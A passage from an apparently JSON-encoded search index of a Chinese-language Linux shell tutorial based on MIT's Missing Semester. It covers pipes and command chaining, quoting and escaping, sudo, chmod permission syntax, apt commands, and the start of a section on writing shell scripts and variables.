<p>\u201c|\u201d\u957f\u5f97\u50cf\u4e00\u4e2a\u7ba1\u9053\uff0c\u5b83\u7684\u4f5c\u7528\u5c31\u662f\u50cf\u7ba1\u9053\u4e00\u6837\u8fde\u63a5\u4e24\u4e2a\u7a0b\u5e8f\u7684\u8f93\u5165\u4e0e\u8f93\u51fa\uff0c\u5b83\u4f1a\u628a\u524d\u9762\u7684\u7a0b\u5e8f\u7684\u8f93\u51fa\u4f5c\u4e3a\u540e\u9762\u7684\u7a0b\u5e8f\u7684\u8f93\u5165\u3002</p> <pre><code>:~$ ls -l / | tail -n1\ndrwxr-xr-x  13 root root    4096 May  2  2023 var\n</code></pre> <p>\u8fd9\u91cc\u7684 <code>tail -n1</code> \u8868\u793a\u5c06\u53d6\u8f93\u5165\u7684\u6700\u540e\u4e00\u884c\u5e76\u8f93\u51fa\u3002</p> <p><code>&amp;&amp;</code> \u5176\u5b9e\u662f\u903b\u8f91\u4e0e\u8fd0\u7b97\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u8fde\u63a5\u4e24\u6761\u547d\u4ee4\uff0c\u5f53\u524d\u9762\u7684\u547d\u4ee4\u6267\u884c\u6210\u529f\u65f6\u624d\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4\u3002\u7528 <code>&amp;&amp;</code> \u8fde\u63a5\u591a\u4e2a\u547d\u4ee4\uff0c\u5047\u5982\u4e2d\u95f4\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u5c31\u4e0d\u4f1a\u7ee7\u7eed\u6267\u884c\uff0c\u5f15\u53d1\u4e00\u8fde\u4e32\u7684\u9519\u8bef\u3002</p> <p><code>||</code> \u76f8\u5e94\u7684\uff0c\u903b\u8f91\u6216\u8fd0\u7b97\u662f\u5f53\u524d\u9762\u7684\u547d\u4ee4\u6267\u884c\u5931\u8d25\u65f6\u624d\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4\u3002\u53ef\u4ee5\u7528\u4e8e\u8bbe\u7f6e\u4e00\u4e2a\u201cPlan B\u201d\uff0c\u5f53\u524d\u9762\u7684\u547d\u4ee4\u6267\u884c\u5931\u8d25\uff0c\u5c31\u6267\u884c\u201cPlan B\u201d\u3002</p> <p><code>;</code> \u5c31\u662f\u5355\u7eaf\u7684\u5148\u540e\u6267\u884c\u4e24\u6761\u547d\u4ee4\uff0c\u65e0\u8bba\u6210\u529f\u4e0e\u5426\uff0c\u4e24\u6761\u547d\u4ee4\u90fd\u4f1a\u6267\u884c\u3002</p>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#iii2","title":"III.2 <code>#</code>","text":"<p><code>#</code>\u8868\u793a\u6ce8\u91ca\uff0c<code>#</code>\u540e\u7684\u6587\u672c\u4f1a\u88ab\u5ffd\u7565\u3002</p> <pre><code>:~$ echo hello\nhello\n:~$ echo **hello**{: .hash}\n:~$ touch hello\n:~$ touch **hello**{: .hash}\ntouch: missing file operand\nTry 'touch --help' for more information.\n</code></pre>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#iii3","title":"III.3 <code>\\</code>\u3001<code>'</code>\u3001<code>\"</code>","text":"<p>\u5728shell\u4e2d\uff0c\u6709\u4e00\u4e9b\u5b57\u7b26\u4e0d\u80fd\u76f4\u63a5\u4f5c\u4e3a\u53c2\u6570\u7684\u4e00\u90e8\u5206\u4f20\u9012\uff0c\u4f8b\u5982<code>!</code>\u3001<code>$</code>\u3001<code></code>\u3001<code>#</code>\u3001<code>\\</code>\u3002</p> <p>\u4f7f\u7528\u53cd\u659c\u6760<code>\\</code>\u53ef\u4ee5\u8f6c\u4e49\u5355\u4e2a\u5b57\u7b26\uff0c\u4f7f\u5176\u6b63\u5e38\u8f93\u51fa\uff1a</p> <pre><code>:~$ echo hello$world\nhello\n:~$ echo hello\\$world\nhello$world\n:~$ echo hello     world\nhello world\n:~$ echo hello\\ \\ \\ \\ \\ world\nhello     world\n:~$ echo hello\\world\nhelloworld\n:~$ echo hello\\\\world\nhello\\world\n</code></pre> <p>\u4f7f\u7528\u5355\u5f15\u53f7<code>'</code>\u62ec\u8d77\u6765\uff0c\u53ef\u4ee5\u8ba9\u5b57\u7b26\u4e32\u539f\u6837\u8f93\u51fa\uff0c\u4e0d\u8fdb\u884c\u8f6c\u4e49\u548c\u66ff\u6362</p> <pre><code>:~$ echo 'hello\\\\world'\nhello\\\\world\n</code></pre> <p>\u4f7f\u7528\u53cc\u5f15\u53f7<code>\"</code>\u62ec\u8d77\u6765\u7684\u5b57\u7b26\u4e32\u4ecd\u7136\u6709\u90e8\u5206\u4f1a\u88ab\u8f6c\u4e49\uff0c\u53c2\u89c1Quoting\u3002</p> <pre><code>:~$ echo '$SHELL'\n$SHELL\n:~$ echo \"$SHELL\"\n/bin/bash\n:~$ echo \"hello world\"\nhello world\n</code></pre>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#iv-sudo","title":"IV sudo","text":"<p>Linux\u7cfb\u7edf\u4e2d\u6709\u4e00\u4e2a\u7528\u6237\u7684\u8eab\u4efd\u662f\u7279\u6b8a\u7684\uff0c\u90a3\u5c31\u662f root \u7528\u6237\uff0croot\u7528\u6237\u62e5\u6709\u6700\u9ad8\u7684\u6743\u9650\uff0c\u53ef\u4ee5\u505a\u51e0\u4e4e\u4efb\u4f55\u4e8b\u60c5\uff0c\u76f4\u63a5\u767b\u5f55\u5230root\u7528\u6237\u662f\u5f88\u5371\u9669\u7684\uff0c\u56e0\u4e3a\u4f60\u53ef\u80fd\u4e00\u4e0d\u5c0f\u5fc3\u5c31\u5229\u7528root\u6743\u9650\u505a\u51fa\u4e86\u4e00\u4e9b\u7834\u73af\u6027\u7684\u64cd\u4f5c\uff08\u4f8b\u5982\uff1a\u8bef\u5220\u9664\u6570\u636e\u3001\u5168\u5c40\u4fee\u6539\u4e86\u5173\u952e\u7cfb\u7edf\u8bbe\u7f6e\uff09\uff0c\u56e0\u6b64\uff0c\u5e38\u5e38\u4f7f\u7528<code>sudo \u547d\u4ee4</code>\uff08\u610f\u601d\u662f do as superuser\uff09\uff0c\u6765\u4f7f\u7528\u8d85\u7ea7\u7528\u6237\u6743\u9650\u6267\u884c\u547d\u4ee4\uff0c\u8fd9\u6837\u53ef\u4ee5\u8ba9\u4f60\u80fd\u518d\u6b21\u786e\u8ba4\u4f60\u7684\u64cd\u4f5c\u65e0\u8bef\u3002</p> <p>\u5f53\u4f60\u8f93\u5165\u4e00\u4e2a\u547d\u4ee4\uff0c\u53d1\u73b0\u547d\u4ee4\u884c\u8f93\u51fa\u4e86\u201cPermission denied\u201d\uff0c\u5f88\u53ef\u80fd\u5c31\u662f\u4f60\u6ca1\u6709\u5408\u9002\u7684\u6743\u9650\u6267\u884c\u8fd9\u4e2a\u547d\u4ee4\uff0c\u53ea\u8981\u5728\u539f\u547d\u4ee4\u524d\u52a0\u4e0a<code>sudo</code>\u5c31\u53ef\u4ee5\u89e3\u51b3\u3002</p> <p>\u7b2c\u4e00\u6b21<code>sudo</code>\u65f6\uff0c\u4f1a\u8f93\u51fa\u4e00\u6bb5\u8fd9\u6837\u7684\u63d0\u793a\uff1a</p> <pre><code>We trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n</code></pre> <p>\u7ffb\u8bd1\u5982\u4e0b\uff1a</p> <pre><code>\u6211\u4eec\u786e\u4fe1\u60a8\u5df2\u7ecf\u6536\u5230\u4e86\u672c\u5730\u7cfb\u7edf\u7ba1\u7406\u5458\u7684\u4f8b\u884c\u8bb2\u89e3\u3002\n\u901a\u5e38\u53ef\u4ee5\u5f52\u7ed3\u4e3a\u4ee5\u4e0b\u4e09\u70b9\uff1a\n    #1) \u5c0a\u91cd\u4ed6\u4eba\u9690\u79c1\u3002\n    #2) \u6253\u5b57\u524d\u5148\u601d\u8003\u3002\n    #3) \u6743\u529b\u8d8a\u5927\uff0c\u8d23\u4efb\u8d8a\u5927\u3002\n</code></pre> <p>\u201cWith great power comes great responsibility.\u201d</p> <p>\u4f7f\u7528root\u6743\u9650\u65f6\u8981\u65f6\u523b\u63d0\u9192\u81ea\u5df1\uff0c\u8c28\u614e\u5bf9\u5f85\u6bcf\u4e00\u4e2a\u547d\u4ee4</p> <p>\u4e0b\u9762\u6709\u4e00\u4e2a\u6765\u81ea MIT Missing Semester \u7684\u4f8b\u5b50\uff0c\u6307\u51fa\u4e86\u4f7f\u7528<code>sudo</code>\u7684\u4e00\u4e2a\u5e38\u89c1\u8bef\u533a\uff1a</p> <p>\u4f8b\u5982\uff0c\u60a8\u7b14\u8bb0\u672c\u7535\u8111\u7684\u5c4f\u5e55\u4eae\u5ea6\u5199\u5728 <code>brightness</code> \u6587\u4ef6\u4e2d\uff0c\u5b83\u4f4d\u4e8e <pre><code>/sys/class/backlight\n</code></pre> \u901a\u8fc7\u5c06\u6570\u503c\u5199\u5165\u8be5\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u6539\u53d8\u5c4f\u5e55\u7684\u4eae\u5ea6\u3002\u73b0\u5728\uff0c\u8e66\u5230\u60a8\u8111\u888b\u91cc\u7684\u7b2c\u4e00\u4e2a\u60f3\u6cd5\u53ef\u80fd\u662f\uff1a <pre><code>$ sudo find -L /sys/class/backlight -maxdepth 2 -name '*brightness*'\n/sys/class/backlight/thinkpad_screen/brightness\n$ cd /sys/class/backlight/thinkpad_screen\n$ sudo echo 3 &gt; brightness\nAn error occurred while redirecting file 'brightness'\nopen: Permission denied\n</code></pre> \u51fa\u4e4e\u610f\u6599\u7684\u662f\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u5230\u4e86\u4e00\u4e2a\u9519\u8bef\u4fe1\u606f\u3002\u6bd5\u7adf\uff0c\u6211\u4eec\u5df2\u7ecf\u4f7f\u7528\u4e86 <code>sudo</code> \u547d\u4ee4\uff01\u5173\u4e8e shell\uff0c\u6709\u4ef6\u4e8b\u6211\u4eec\u5fc5\u987b\u8981\u77e5\u9053\u3002<code>|</code>\u3001<code>&gt;</code>\u3001\u548c <code>&lt;</code> \u662f\u901a\u8fc7 shell \u6267\u884c\u7684\uff0c\u800c\u4e0d\u662f\u88ab\u5404\u4e2a\u7a0b\u5e8f\u5355\u72ec\u6267\u884c\u3002 <code>echo</code> \u7b49\u7a0b\u5e8f\u5e76\u4e0d\u77e5\u9053 <code>|</code> \u7684\u5b58\u5728\uff0c\u5b83\u4eec\u53ea\u77e5\u9053\u4ece\u81ea\u5df1\u7684\u8f93\u5165\u8f93\u51fa\u6d41\u4e2d\u8fdb\u884c\u8bfb\u5199\u3002 \u5bf9\u4e8e\u4e0a\u9762\u8fd9\u79cd\u60c5\u51b5\uff0c shell (\u6743\u9650\u4e3a\u60a8\u7684\u5f53\u524d\u7528\u6237) \u5728\u8bbe\u7f6e <code>sudo echo</code> \u524d\u5c1d\u8bd5\u6253\u5f00 brightness \u6587\u4ef6\u5e76\u5199\u5165\uff0c\u4f46\u662f\u7cfb\u7edf\u62d2\u7edd\u4e86 shell \u7684\u64cd\u4f5c\u56e0\u4e3a\u6b64\u65f6 shell \u4e0d\u662f\u6839\u7528\u6237\u3002</p> <p>\u660e\u767d\u8fd9\u4e00\u70b9\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u64cd\u4f5c\uff1a <pre><code>$ echo 3 | sudo tee brightness\n</code></pre> \u56e0\u4e3a\u6253\u5f00 /sys \u6587\u4ef6\u7684\u662f tee \u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u5e76\u4e14\u8be5\u7a0b\u5e8f\u4ee5 root \u6743\u9650\u5728\u8fd0\u884c\uff0c\u56e0\u6b64\u64cd\u4f5c\u53ef\u4ee5\u8fdb\u884c\u3002 \u8fd9\u6837\u60a8\u5c31\u53ef\u4ee5\u5728 /sys \u4e2d\u6109\u5feb\u5730\u73a9\u800d\u4e86\uff0c\u4f8b\u5982\u4fee\u6539\u7cfb\u7edf\u4e2d\u5404\u79cdLED\u7684\u72b6\u6001\uff08\u8def\u5f84\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\uff09\uff1a <pre><code>$ echo 1 | sudo tee /sys/class/leds/input6::scrolllock/brightness\n</code></pre></p>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#v-chmod","title":"V chmod","text":"<p>\u524d\u9762\u6211\u4eec\u63d0\u5230\u4e86\u6587\u4ef6\u7684\u4e09\u79cd\u6743\u9650<code>rwx</code>\uff0c\u4f7f\u7528<code>chmod</code>\u53ef\u4ee5\u8c03\u6574\u8fd9\u4e9b\u6743\u9650\u3002</p> <p>chmod \u53ef\u4ee5\u4f7f\u7528\u4e24\u79cd\u8bed\u6cd5\uff0c\u5b57\u7b26\u4e32\u8bed\u6cd5\u548c\u6570\u5b57\u8bed\u6cd5\u3002</p>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#v1","title":"V.1 \u5b57\u7b26\u4e32\u8bed\u6cd5","text":"<ul> <li>\u7528<code>ugoa</code>\u56db\u4e2a\u5b57\u6bcd\u8868\u793a\u8bbe\u7f6e\u54ea\u4e9b\u4eba\u7684\u6743\u9650</li> <li>\u7528<code>+-=</code>\u4e09\u4e2a\u5b57\u6bcd\u8868\u793a\u5982\u4f55\u6539\u53d8\u6743\u9650</li> <li>\u7528<code>rwx</code>\u8868\u793a\u4ec0\u4e48\u6743\u9650</li> </ul> \u7b26\u53f7 \u542b\u4e49 u user\uff0c\u6587\u4ef6\u7684\u62e5\u6709\u8005 g group\uff0c\u6587\u4ef6\u62e5\u6709\u8005\u6240\u5728\u7684\u7ec4\u7684\u5176\u4ed6\u4eba o others\uff0c\u9664\u4e86ug\u7684\u5176\u4ed6\u4eba a all\uff0c\u6240\u6709\u4eba + \u6dfb\u52a0\u6743\u9650 - \u51cf\u5c11\u6743\u9650 = \u8bbe\u7f6e\u6743\u9650 r read\uff0c\u8bfb\u53d6 w write\uff0c\u5199\u5165 x execute\uff0c\u6267\u884c <p>\u4f8b\u5982\uff1a</p> <p><code>chmod ug+rw file</code>\u8868\u793a\u6587\u4ef6\u62e5\u6709\u8005\u6240\u5728\u7684\u7ec4\u7684\u6240\u6709\u4eba\u6dfb\u52a0\u8bfb\u53d6\u548c\u5199\u5165file\u7684\u6743\u9650\u3002</p> <p><code>chmod a-w file</code>\u8868\u793a\u6240\u6709\u4eba\u90fd\u4e0d\u80fd\u5199\u5165file\u3002</p> <p><code>chmod ug=rwx,o=x file</code>\u8868\u793a\u6587\u4ef6\u62e5\u6709\u8005\u6240\u5728\u7684\u7ec4\u7684\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u8bfb\u3001\u5199\u3001\u8fd0\u884cfile\uff0c\u5176\u4ed6\u4eba\u53ea\u80fd\u8fd0\u884cfile</p>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#v2","title":"V.2 \u516b\u8fdb\u5236\u6570\u5b57\u8bed\u6cd5","text":"<p>\u4e00\u5171\u6709\u4e09\u79cd\u6743\u9650<code>rwx</code>\uff0c\\(2^3=8\\)\uff0c\u53ef\u4ee5\u4f7f\u75288\u4e2a\u6570\u5b57\u6765\u8868\u793a\u67d0\u79cd\u4eba\u7684\u6743\u9650\uff0c\u6743\u9650\u53c8\u5206\u4e3a\u9488\u5bf9\u4e09\u79cd\u4eba<code>ugo</code>\uff0c\u4e8e\u662f\uff0c\u4e00\u4e2a\u6587\u4ef6\u7684\u6743\u9650\u53ef\u4ee5\u7528\u4e09\u4e2a0-7\u7684\u6570\u5b57\u8868\u793a\u3002</p> <p><code>rwx</code>\u4e09\u79cd\u6743\u9650\u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d\u53ef\u4ee5\u7ec4\u6210\u4e00\u4e2a\u4e09\u4f4d\u4e8c\u8fdb\u5236\u6570\uff0c<code>0</code>\u4ee3\u8868\u6ca1\u6709\u8fd9\u79cd\u6743\u9650\uff0c<code>1</code>\u4ee3\u8868\u6709\uff0c\u518d\u5c06\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6570\u8f6c\u5316\u6210\u516b\u8fdb\u5236\uff08\u6216\u8005\u5341\u8fdb\u5236\uff0c\u5728\u8fd9\u91cc\u7ed3\u679c\u662f\u4e00\u6837\u7684\uff09\uff0c\u5c31\u5f97\u5230\u4e86\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u4e0b\u9762\u5217\u51fa\u4e860-7\u5bf9\u5e94\u7684\u6743\u9650\uff1a</p> \u516b\u8fdb\u5236 \u4e8c\u8fdb\u5236 \u6743\u9650 0 000 --- 1 001 --x 2 010 -w- 3 011 -wx 4 100 r-- 5 101 r-x 6 110 rw- 7 111 rwx <p>\u4f8b\u5982\uff1a</p> <ul> <li><code>chmod 777 file</code>\u4ee3\u8868\u6240\u6709\u4eba\u90fd\u6709file\u7684\u6240\u6709\u6743\u9650</li> <li><code>chmod 755 file</code>\u4ee3\u8868file\u7684\u6743\u9650\u662f<code>rwxr-xr-x</code></li> </ul> <p>755\u662f\u521b\u5efa\u65b0\u6587\u4ef6\u5939\u7684\u9ed8\u8ba4\u6743\u9650</p> <ul> <li><code>chmod 644 file</code>\u4ee3\u8868file\u7684\u6743\u9650\u662f<code>rw-r--r--</code></li> </ul> <p>644\u662f\u521b\u5efa\u65b0\u6587\u4ef6\u7684\u9ed8\u8ba4\u6743\u9650</p> <p>\u4f7f\u7528\u6570\u5b57\u6765\u8bbe\u7f6e\u6743\u9650\uff0c\u53ef\u4ee5\u4ec5\u4ec5\u7528\u4e09\u4e2a\u5b57\u7b26\u5c31\u8bbe\u7f6e\u597d\u6bcf\u4e00\u4e2a\u6743\u9650\uff0c\u975e\u5e38\u65b9\u4fbf\u5feb\u6377\u3002</p>","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#vi","title":"VI \u5176\u4ed6\u5e38\u7528","text":"apt \u547d\u4ee4\u53d6\u4ee3\u7684\u547d\u4ee4 \u547d\u4ee4\u7684\u529f\u80fd apt install apt-get install \u5b89\u88c5\u8f6f\u4ef6\u5305 apt remove apt-get remove \u79fb\u9664\u8f6f\u4ef6\u5305 apt purge apt-get purge \u79fb\u9664\u8f6f\u4ef6\u5305\u53ca\u914d\u7f6e\u6587\u4ef6 apt update apt-get update \u5237\u65b0\u5b58\u50a8\u5e93\u7d22\u5f15 apt upgrade apt-get upgrade \u5347\u7ea7\u6240\u6709\u53ef\u5347\u7ea7\u7684\u8f6f\u4ef6\u5305 apt autoremove apt-get autoremove \u81ea\u52a8\u5220\u9664\u4e0d\u9700\u8981\u7684\u5305 apt full-upgrade apt-get dist-upgrade \u5728\u5347\u7ea7\u8f6f\u4ef6\u5305\u65f6\u81ea\u52a8\u5904\u7406\u4f9d\u8d56\u5173\u7cfb apt search apt-cache search \u641c\u7d22\u5e94\u7528\u7a0b\u5e8f apt show apt-cache show \u663e\u793a\u5b89\u88c5\u7ec6\u8282","tags":["MIT"]},{"location":"tutorial/MIT/0_linux-shell/#vii","title":"VII \u53c2\u8003\u8d44\u6599","text":"<ul> <li>Cyrus' Blog</li> <li>MIT The Missing Semester of Your CS Education</li> <li>GNU manual documents</li> </ul>","tags":["MIT"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/","title":"1 shell script and basic tools","text":"Summary <p>\u672c\u6587\u4ecb\u7ecd\u4e86 shell \u811a\u672c\u548c\u4e00\u4e9b\u57fa\u672c\u5de5\u5177\u7684\u4f7f\u7528\u65b9\u6cd5\u3002</p> <ul> <li>shell \u811a\u672c\uff1a \u4f7f\u7528 <code>#!</code> \u6307\u5b9a\u89e3\u91ca\u5668\uff0c\u4f7f\u7528 <code>echo</code> \u8f93\u51fa\u6587\u672c\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e24\u79cd\u65b9\u5f0f\u8fd0\u884c\u3002</li> <li>shell \u53d8\u91cf\uff1a \u4f7f\u7528 <code>=</code> \u5b9a\u4e49\uff0c\u4f7f\u7528 <code>$</code> \u4f7f\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528\u53ea\u8bfb\u53d8\u91cf\u3002</li> <li>\u5b57\u7b26\u4e32\uff1a \u4f7f\u7528\u5355\u5f15\u53f7\u6216\u53cc\u5f15\u53f7\u5b9a\u4e49\uff0c\u53ef\u4ee5\u4f7f\u7528\u62fc\u63a5\u548c\u6570\u7ec4\u3002</li> <li>\u901a\u914d\uff1a \u4f7f\u7528 <code>?</code> \u548c <code>*</code> \u8fdb\u884c\u5339\u914d\uff0c\u4f7f\u7528\u82b1\u62ec\u53f7\u5c55\u5f00\u547d\u4ee4\u3002</li> <li>shebang\uff1a \u4f7f\u7528 <code>#!</code> \u58f0\u660e\u89e3\u91ca\u5668\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>env</code> \u63d0\u9ad8\u53ef\u79fb\u690d\u6027\u3002</li> <li>shell \u5de5\u5177\uff1a \u4ecb\u7ecd\u4e86 <code>man</code>\u3001<code>TLDR pages</code>\u3001<code>find</code>\u3001<code>fd</code>\u3001<code>locate</code>\u3001<code>grep</code>\u3001<code>rg</code>\u3001<code>history</code>\u3001<code>fasd</code> \u548c <code>autojump</code> \u7b49\u5de5\u5177\u3002</li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#i-shell","title":"I Shell \u811a\u672c","text":"<p>Shell \u811a\u672c\uff08shell script\uff09\uff0c\u662f\u4e00\u79cd\u4e3a shell \u7f16\u5199\u7684\u811a\u672c\u7a0b\u5e8f\u3002</p> <p>\u4e1a\u754c\u6240\u8bf4\u7684 shell \u901a\u5e38\u90fd\u662f\u6307 shell \u811a\u672c\uff0c\u4f46\u8bfb\u8005\u670b\u53cb\u8981\u77e5\u9053\uff0cshell \u548c shell script \u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u6982\u5ff5\u3002</p> <p>\u7531\u4e8e\u4e60\u60ef\u7684\u539f\u56e0\uff0c\u7b80\u6d01\u8d77\u89c1\uff0c\u672c\u6587\u51fa\u73b0\u7684 \"shell \u7f16\u7a0b\" \u90fd\u662f\u6307 shell \u811a\u672c\u7f16\u7a0b\uff0c\u4e0d\u662f\u6307\u5f00\u53d1 shell \u81ea\u8eab\u3002</p> <p>\u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4eba\u4eec\u5e76\u4e0d\u533a\u5206 Bourne Shell \u548c Bourne Again Shell\uff0c\u6240\u4ee5\uff0c\u50cf\u00a0#!/bin/sh\uff0c\u5b83\u540c\u6837\u4e5f\u53ef\u4ee5\u6539\u4e3a\u00a0#!/bin/bash\u3002</p> <p><code>#!</code>\u00a0\u544a\u8bc9\u7cfb\u7edf\u5176\u540e\u8def\u5f84\u6240\u6307\u5b9a\u7684\u7a0b\u5e8f\u5373\u662f\u89e3\u91ca\u6b64\u811a\u672c\u6587\u4ef6\u7684 Shell \u7a0b\u5e8f\u3002</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#i1","title":"I.1 \u521b\u5efa\u811a\u672c","text":"<p>\u5982\u679c\u6211\u4eec\u60f3\u8981\u521b\u5efa\u4e00\u4e2a shell \u811a\u672c\uff0c\u90a3\u4e48\uff0c\u6253\u5f00\u6587\u672c\u7f16\u8f91\u5668(\u53ef\u4ee5\u4f7f\u7528 vi/vim \u6216\u8005 nano \u547d\u4ee4\uff08\u65b0\u624b\u63a8\u8350\uff09\u6765\u521b\u5efa\u6587\u4ef6)\uff0c\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6 first.sh\uff0c\u6269\u5c55\u540d\u4e3a sh\uff08sh\u4ee3\u8868shell\uff09\uff0c\u6269\u5c55\u540d\u5e76\u4e0d\u5f71\u54cd\u811a\u672c\u6267\u884c\uff0c\u89c1\u540d\u77e5\u610f\u5c31\u597d\uff0c\u5982\u679c\u4f60\u7528 php \u5199 shell \u811a\u672c\uff0c\u6269\u5c55\u540d\u5c31\u7528 php \u597d\u4e86\u3002</p> <p>\u8f93\u5165\u4e00\u4e9b\u4ee3\u7801\uff0c\u7b2c\u4e00\u884c\u4e00\u822c\u662f\u8fd9\u6837\uff1a</p> first.sh<pre><code>$ nano first.sh # \u63a5\u4e0b\u6765\u5c06\u8fdb\u5165\u7f16\u8f91\u754c\u9762\n#!/bin/bash\necho 'Hello world!'\n</code></pre> <p>\u4e4b\u540e\u53ea\u9700\u8981 <code>ctrl+o</code> \u4fdd\u5b58\uff0c\u56de\u8f66\u786e\u8ba4\u6587\u4ef6\u540d\uff0c<code>ctrl+x</code> \u9000\u51fa\u5373\u53ef\u3002</p> <p><code>#!</code>\u00a0\u662f\u4e00\u4e2a\u7ea6\u5b9a\u7684\u6807\u8bb0\uff0c\u5b83\u544a\u8bc9\u7cfb\u7edf\u8fd9\u4e2a\u811a\u672c\u9700\u8981\u4ec0\u4e48\u89e3\u91ca\u5668\u6765\u6267\u884c\uff0c\u5373\u4f7f\u7528\u54ea\u4e00\u79cd Shell\uff1becho \u547d\u4ee4\u7528\u4e8e\u5411\u7a97\u53e3\u8f93\u51fa\u6587\u672c</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#i2-shell","title":"I.2 \u8fd0\u884c Shell \u811a\u672c\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a","text":"<p>1\u3001\u4f5c\u4e3a\u53ef\u6267\u884c\u7a0b\u5e8f</p> <p>\u5c06\u4e0a\u9762\u7684\u4ee3\u7801\u4fdd\u5b58\u4e3a first.sh\uff0c\u5e76 cd \u5230\u76f8\u5e94\u76ee\u5f55\uff1a</p> <pre><code>chmod +x ./first.sh  #\u4f7f\u811a\u672c\u5177\u6709\u6267\u884c\u6743\u9650\n# \u6216\u8005\u6211\u4eec\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u8bed\u53e5\nchmod 775 ./first.sh \n./first.sh  #\u6267\u884c\u811a\u672c\n</code></pre> <p>\u770b\u4e0d\u61c2 775 \u7684\u8bdd\u56de\u770b [[]]</p> <p>\u6ce8\u610f\uff0c\u4e00\u5b9a\u8981\u5199\u6210\u00a0./first.sh\uff0c\u800c\u4e0d\u662f\u00a0first.sh\uff0c\u8fd0\u884c\u5176\u5b83\u4e8c\u8fdb\u5236\u7684\u7a0b\u5e8f\u4e5f\u4e00\u6837\uff0c\u76f4\u63a5\u5199 first.sh\uff0clinux \u7cfb\u7edf\u4f1a\u53bb PATH \u91cc\u5bfb\u627e\u6709\u6ca1\u6709\u53eb first.sh \u7684\uff0c\u800c\u53ea\u6709 /bin, /sbin, /usr/bin\uff0c/usr/sbin \u7b49\u5728 PATH \u91cc\uff0c\u4f60\u7684\u5f53\u524d\u76ee\u5f55\u901a\u5e38\u4e0d\u5728 PATH \u91cc\uff0c\u6240\u4ee5\u5199\u6210 first.sh \u662f\u4f1a\u627e\u4e0d\u5230\u547d\u4ee4\u7684\uff0c\u8981\u7528 ./first.sh \u544a\u8bc9\u7cfb\u7edf\u8bf4\uff0c\u5c31\u5728\u5f53\u524d\u76ee\u5f55\u627e\u3002</p> <p>2\u3001\u4f5c\u4e3a\u89e3\u91ca\u5668\u53c2\u6570</p> <p>\u8fd9\u79cd\u8fd0\u884c\u65b9\u5f0f\u662f\uff0c\u76f4\u63a5\u8fd0\u884c\u89e3\u91ca\u5668\uff0c\u5176\u53c2\u6570\u5c31\u662f shell \u811a\u672c\u7684\u6587\u4ef6\u540d\uff0c\u5982\uff1a</p> <p><code>/bin/sh first.sh</code> </p> <p>\u6211\u73b0\u5728\u662f\u4f7f\u7528 vscode \u8fdc\u7a0b ssh \u8fde\u63a5 ubuntu \u8fdb\u884c\u7684\u7f16\u8f91\u8fd0\u884c\uff0c\u5982\u679c\u5355\u7eaf\u4f7f\u7528\u7ec8\u7aef\u53ef\u80fd\u9700\u8981\u76f8\u5173 vim \u7f16\u8f91\u6280\u80fd\uff0c\u8bf7\u81ea\u884c\u4e86\u89e3\uff1b\u6682\u65f6\u4f7f\u7528\u4e0b\u65b9\u65b9\u5f0f\u4e5f\u65e0\u59a8\uff0c\u4f46\u57fa\u4e8e EOF \u53ef\u505a\u591a\u884c\u6ce8\u91ca\uff0c\u6bd4\u8f83\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898 </p> <p>\u7406\u8bba\u4e0a\u6211\u4eec\u6700\u597d\u4e0d\u4f7f\u7528\u53cc\u5f15\u53f7</p> <p><code>!</code>\u00a0\u5373\u4f7f\u88ab\u53cc\u5f15\u53f7\uff08<code>\"</code>\uff09\u5305\u88f9\u4e5f\u5177\u6709\u7279\u6b8a\u7684\u542b\u4e49\u3002\u5355\u5f15\u53f7\uff08<code>'</code>\uff09\u5219\u4e0d\u4e00\u6837\uff0c\u6b64\u5904\u5229\u7528\u8fd9\u4e00\u70b9\u89e3\u51b3\u8f93\u5165\u95ee\u9898\u3002\u66f4\u591a\u4fe1\u606f\u8bf7\u53c2\u8003\u00a0Bash quoting \u624b\u518c</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#ii-shell","title":"II shell \u53d8\u91cf","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#ii1","title":"II.1 \u53d8\u91cf\u5b9a\u4e49","text":"<p>\u5b9a\u4e49\u53d8\u91cf\u65f6\uff0c\u53d8\u91cf\u540d\u4e0d\u52a0\u7f8e\u5143\u7b26\u53f7\uff08$\uff0cPHP \u8bed\u8a00\u4e2d\u53d8\u91cf\u9700\u8981\uff09\uff0c\u4f8b\u5982</p> <pre><code>my_name=qssg #\u8bf7\u4e0d\u8981\u5728 = 